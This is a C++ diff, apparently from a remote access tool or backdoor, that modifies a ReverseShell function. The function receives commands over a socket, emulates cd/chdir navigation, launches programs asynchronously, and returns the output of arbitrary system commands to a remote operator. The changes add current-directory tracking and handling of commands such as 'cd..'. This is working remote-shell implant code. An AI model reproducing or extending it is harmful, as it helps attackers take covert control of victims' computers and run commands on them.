@@ -136,6 +136,9 @@ void ReverseShell(SOCKET Sock)
 	
 	string Cmd;
 	string Res = "OK";
+	string Path = du.GetModuleFilePath(false);
+	
+	du.SetCurrDir(Path);
 	
 	while (true)
 	{
@@ -144,31 +147,43 @@ void ReverseShell(SOCKET Sock)
 		if (Cmd == "")
 			return;
 		else if (Cmd == "Get cd")
-			Res = du.GetModuleFilePath(false);
+			Res = Path;
 		else if (ToLowerCase(Cmd).find("chdir") != string::npos)
 		{
-			if (ToLowerCase(Cmd) == "chdir ..")
+			if (ToLowerCase(Cmd) == "chdir .." || ToLowerCase(Cmd) == "chdir..")
 			{
-				string tmp = du.GetModuleFilePath();
-				du.SetCurrDir(tmp.substr(0, tmp.find_last_of("\\")));
+				if (Path.size() > 3)
+					Path = Path.substr(0, Path.find_last_of("\\"));
+				if (Path.size() == 2)
+					Path += "\\";
+
+				du.SetCurrDir(Path);
 				
 				Res = "\n";
 			}
 			else if (ToLowerCase(Cmd).find("/d") != string::npos && ToLowerCase(Cmd.substr(0, 9)) == "chdir /d ")
 			{
 				if (Cmd.find("\"") != string::npos)
-					du.SetCurrDir(Cmd.substr(10, Cmd.find_last_of("\"") - 10));
+				{
+					if (du.SetCurrDir(Cmd.substr(10, Cmd.find_last_of("\"") - 10)))
+						Path = du.GetCurrDir();
+				}
 				else
-					du.SetCurrDir(Cmd.substr(9));
+					if (du.SetCurrDir(Cmd.substr(9)))
+						Path = du.GetCurrDir();
 				
 				Res = "\n";
 			}
 			else if (ToLowerCase(Cmd.substr(0, 6)) == "chdir ")
 			{
 				if (Cmd.find("\"") != string::npos)
-					du.SetCurrDir(Cmd.substr(7, Cmd.find_last_of("\"") - 7));
+				{
+					if (du.SetCurrDir(Cmd.substr(7, Cmd.find_last_of("\"") - 7)))
+						Path = du.GetCurrDir();
+				}
 				else
-					du.SetCurrDir(Cmd.substr(6));
+					if (du.SetCurrDir(Cmd.substr(6)))
+						Path = du.GetCurrDir();
 				
 				Res = "\n";
 			}
@@ -177,28 +192,40 @@ void ReverseShell(SOCKET Sock)
 		}
 		else if (ToLowerCase(Cmd).find("cd") != string::npos)
 		{
-			if (ToLowerCase(Cmd) == "cd ..")
+			if (ToLowerCase(Cmd) == "cd .." || ToLowerCase(Cmd) == "cd..")
 			{
-				string tmp = du.GetModuleFilePath();
-				du.SetCurrDir(tmp.substr(0, tmp.find_last_of("\\")));
+				if (Path.size() > 3)
+					Path = Path.substr(0, Path.find_last_of("\\"));
+				if (Path.size() == 2)
+					Path += "\\";
+
+				du.SetCurrDir(Path);
 				
 				Res = "\n";
 			}
 			else if (ToLowerCase(Cmd).find("/d") != string::npos && ToLowerCase(Cmd.substr(0, 6)) == "cd /d ")
 			{
 				if (Cmd.find("\"") != string::npos)
-					du.SetCurrDir(Cmd.substr(7, Cmd.find_last_of("\"") - 7));
+				{
+					if (du.SetCurrDir(Cmd.substr(7, Cmd.find_last_of("\"") - 7)))
+						Path = du.GetCurrDir();
+				}
 				else
-					du.SetCurrDir(Cmd.substr(6));
+					if (du.SetCurrDir(Cmd.substr(6)))
+						Path = du.GetCurrDir();
 				
 				Res = "\n";
 			}
 			else if (ToLowerCase(Cmd.substr(0, 3)) == "cd ")
 			{
 				if (Cmd.find("\"") != string::npos)
-					du.SetCurrDir(Cmd.substr(4, Cmd.find_last_of("\"") - 4));
+				{
+					if (du.SetCurrDir(Cmd.substr(4, Cmd.find_last_of("\"") - 4)))
+						Path = du.GetCurrDir();
+				}
 				else
-					du.SetCurrDir(Cmd.substr(3));
+					if (du.SetCurrDir(Cmd.substr(3)))
+						Path = du.GetCurrDir();
 				
 				Res = "\n";
 			}
@@ -210,8 +237,13 @@ void ReverseShell(SOCKET Sock)
 			COMUNICAZIONI::ReverseShell(Sock, "Reverse shell closed");
 			return;
 		}
+		else if (ToLowerCase(Cmd).substr(0, 7) == "notepad")
+		{
+			su.AsyncCMD(Cmd);
+			Res = "\n";
+		}
 		else
-			Res = su.GetCMDOutput(Cmd);
+			Res = su.GetCMDOutput(Cmd) + "\n";
 	}
 }
 
